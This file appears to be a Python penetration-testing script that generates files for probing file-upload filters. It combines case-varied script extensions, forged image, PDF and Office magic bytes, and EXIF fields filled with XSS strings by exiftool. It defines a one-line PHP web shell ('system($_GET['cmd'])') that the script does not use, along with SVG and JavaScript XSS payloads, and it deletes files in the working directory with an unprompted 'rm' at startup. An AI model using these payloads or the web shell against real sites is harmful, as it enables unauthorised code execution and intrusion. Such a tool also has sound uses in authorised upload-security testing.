#/usr/bin/env python3
import argparse
import os
import sys
import subprocess
from PIL import Image

print(
'''
 _______  _______ _____ _   _ ____  _____ ____  
| ____\ \/ /_   _| ____| \ | |  _ \| ____|  _ \ 
|  _|  \  /  | | |  _| |  \| | | | |  _| | |_) |
| |___ /  \  | | | |___| |\  | |_| | |___|  _ < 
|_____/_/\_\ |_| |_____|_| \_|____/|_____|_| \_\
                                                
''')

extension_php = ["php", "PHP", "PhP", "pHp", "phtml", "pHtml","php3", "PhP3", 
"PHP3", "php5", "pHp5", "PHP5", "inc", "iNc", "INC" ]
extension_asp = ["asp", "ASP", "AsP", "aspx", "ASPX", "Aspx"]
extension_perl = ["pl", "PL", "Pl", "pm", "PM", "Pm", "cgi", "CGI", "cGi", "lib", "LIB", "lIb"]
extension_jsp = ["jsp", "JSP", "Jsp", "jspx", "jSpX", "JSPX", "jsw", "JSW", "jsW", "jsv", "Jsv", "JSV", 
"jspf", "jSpf", "JSPF"]
extension_colfusion = ["cfm", "CFM", "Cfm", "cfml", "CFML", "CfmL", "cfc", "CfC", "CFC", "dbm", "DBM", "Dbm"]
extension_gif = ["gif", "Gif", "GIF", ""]
extension_png = ["PNG", "png", "PnG", ""]
extension_jpeg = ["jpeg", "JPEG", "JpEG", ""]
extension_svg = ["svg", "SVG", "SvG"]
extension_pdf = ["pdf", "PDF", "Pdf"]
extension_office = ["doc", "xls", "ppt", "msg", "Doc", "Xls", "Ppt", "Msg", "DOC", "XLS", "PPT"]
extension_html = ["html", "HTML", "Html", "htm", "HTM", "Htm"]
extension_js =  ["JS", "js", "Js"]
extension_css = ["css", "CSS", "Css"]

mg_gif = b"\x47\x49\x46\x38\x37\x61"
mg_gif_2 = b"\x47\x49\x46\x38\x39\x61"
mg_png = b"\x89\x50\x4E\x47\x0D\x0A\x1A\x0A"
mg_jpeg = b"\xFF\xD8\xFF\xDB"
mg_jpeg_2 = b"\xFF\xD8\xFF\xEE"
mg_jpeg_3 = b"\xFF\xD8\xFF\xE0\x00\x10\x4A\x46\x49\x46\x00\x01"
mg_pdf = b"\x25\x50\x44\x46\x2d"
mg_office = b"\xD0\xCF\x11\xE0\xA1\xB1\x1A\xE1"

payload_php = [b"<?php echo '<p>Hello there!</p>'; ?>", "<?php system($_GET['cmd']);?>"]
payload_asp = [b'<%Response. Write( "HeIIo there"); %>']
payload_perl = [b'print("Hello, there!");']
payload_jsp = [b"Hello there, today is: <%= new java.util.Date().toString() %>"]
payload_colfucion = [b'<cfscript> writeOutput("Hello World!"); </cfscript>']
payload_svg = [b'<svg xmlns="http://www.w3.org/1999/svg"><script>alert(1)</script></svg>']
payload_bash =[b""]
payload_powershell = [b""] 
payload_html = [b"<h1>Hello World<h1>"]
payload_js = [b"<script>alert(document.domain)</script"]
payload_css = [b"body { background-color: lightblue;}"]

exifs_tab = ["ImageDescription", "Make", "Model", "Software", "Artist","Copyright", "XPTitle", 
"XPComment", "XPAuthor", "XPSubject", "Location", "Description", "Author"]


def ex_generator(extension):
	if extension == 'php':
		for ex in extension_php:
			f = open("1." + ex, "w")
			add_script("1." + ex, payload_php[0])
	elif extension == 'asp':
		for ex in extension_asp:
			f = open("1." + ex, "w")
			add_script("1." + ex, payload_asp[0])
	elif extension == "perl":
		for ex in extension_perl:
			f = open("1." + ex, "w")
			add_script("1." + ex, payload_perl[0])
	elif extension == "jsp":
		for ex in extension_jsp:
			f = open("1." + ex, "w")
			add_script("1." + ex, payload_jsp[0])
	elif extension == "coldfusin":
		for ex in extension_colfusion:
			f = open("1." + ex, "w")
			add_script("1." + ex, payload_colfucion[0])
	elif extension == "html":
		for ex in extension_html:
			f = open("1." + ex, "w")
			add_script("1." + ex, payload_html[0])
	elif extension == "js":
		for ex in extension_js:
			f = open("1." + ex, "w")
			add_script("1." + ex, payload_js[0])
	elif extension == "css":
		for ex in extension_css:
			f = open("1." + ex, "w")
			add_script("1." + ex, payload_css[0])
	elif extension == "svg":
		for ex in extension_svg:
			f = open("1." + ex, "w")
			add_script("1." + ex, payload_svg[0])

def magic_files(extension):
	if extension == "gif":
		for ex in extension_gif:
			f = open("1." + ex, "w")
			magic_bytes("1." + ex, mg_gif)
	if extension == "png":
		for ex in extension_png:
			f = open("1." + ex, "w")
			magic_bytes("1." + ex, mg_png)
		grafic_generator(extension, exifs_tab)
	if extension == "jpeg":
		for ex in extension_jpeg:
			f = open("1." + ex, "w")
			magic_bytes("1." + ex, mg_jpeg)
		grafic_generator(extension, exifs_tab)
	if extension == "pdf":
		for ex in extension_pdf:
			f = open("1." + ex, "w")
			magic_bytes("1." + ex, mg_pdf)
	if extension == "office":
		for ex in extension_office:
			f = open("1." + ex, "w")
			magic_bytes("1." + ex, mg_office)

def magic_bytes(file, bytes):
	with open(file, "ab") as binary_file:
		num_bytes_written = binary_file.write(bytes)
		
def add_script(file, script):
	with open(file, "ab") as text_file:
		text_written = text_file.write(script)

def exifs(image_file, e_tab):
	for e in e_tab:
		att = "-{0}={1}".format(e, "<script>alert(document.doman)</script>")
		subprocess.call(["exiftool", att, image_file])
	subprocess.call(["exiftool", image_file])

def grafic_generator(extension, e_tab):
	img = Image.new('RGB', (60, 60), color = 'black')
	if extension == "png":
		img.save('file.png')
		exifs('file.png', e_tab)
	elif extension == "jpeg":
		img.save('file.jpg')
		exifs('file.jpg', e_tab)

parser = argparse.ArgumentParser(description="File generator, example usage: 'python extender.py -e php'")


os.system("rm 1* ; rm file.*")

parser.add_argument('-e', dest='format', help="generate file", 
	choices=['php', 'asp', 'perl', 'jsp', 'coldfusin', 'gif', 'png', 'jpeg', 'svg', "pdf", "office", "html",
	"js", "css"])

args = parser.parse_args()

extension = args.format
if extension == 'php':
	ex_generator('php')
elif extension == "asp":
	ex_generator('asp')
elif extension == "perl":
	ex_generator('perl')
elif extension == "jsp":
	ex_generator("jsp")
elif extension == "coldfusin":
	ex_generator("coldfusin")
elif extension == "png":
	magic_files('png')
elif extension == "gif":
	magic_files('gif')
elif extension == "jpeg":
	magic_files('jpeg')
elif extension == "svg":
	ex_generator('svg')
elif extension == "pdf":
	magic_files('pdf')
elif extension == "html":
	ex_generator('html')
elif extension == "js":
	ex_generator('js')
elif extension == "css":
	ex_generator('css')
	
	
	
	
